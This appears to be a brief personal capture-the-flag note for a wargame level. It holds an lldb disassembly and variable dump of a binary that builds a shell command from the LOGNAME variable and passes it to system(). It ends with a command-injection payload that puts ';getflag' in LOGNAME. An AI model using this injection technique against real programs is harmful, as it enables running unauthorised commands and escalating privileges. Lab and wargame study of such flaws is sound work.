@@ -1,0 +1,28 @@
+if I want to follow a fork:
+settings set target.process.follow-fork-mode child
+
+0x8048576 <+98>:  call   0x8048400                 ; symbol stub for: getenv
+0x804857b <+103>: mov    dword ptr [esp + 0x8], eax
+0x804857f <+107>: mov    dword ptr [esp + 0x4], 0x8048688
+0x8048587 <+115>: lea    eax, [esp + 0x14]
+0x804858b <+119>: mov    dword ptr [esp], eax
+0x804858e <+122>: call   0x8048440                 ; symbol stub for: asprintf
+->  0x8048593 <+127>: mov    eax, dword ptr [esp + 0x14]
+0x8048597 <+131>: mov    dword ptr [esp], eax
+0x804859a <+134>: call   0x8048410                 ; symbol stub for: system
+0x804859f <+139>: leave
+0x80485a0 <+140>: ret
+                                        
+(lldb) fr v
+(int) argc = 1
+(char **) argv = 0xffffd054
+(char **) envp = 0xffffd05c
+(char *) buffer = 0x0804b210 "/bin/echo username "
+(gid_t) gid = 1000
+(uid_t) uid = 1000
+
+wheere username is set in the LOGNAME env variable
+
+so you can change your LOGNAME to anything and it just gets pasted there.
+
+LOGNAME=";getflag" ./level07
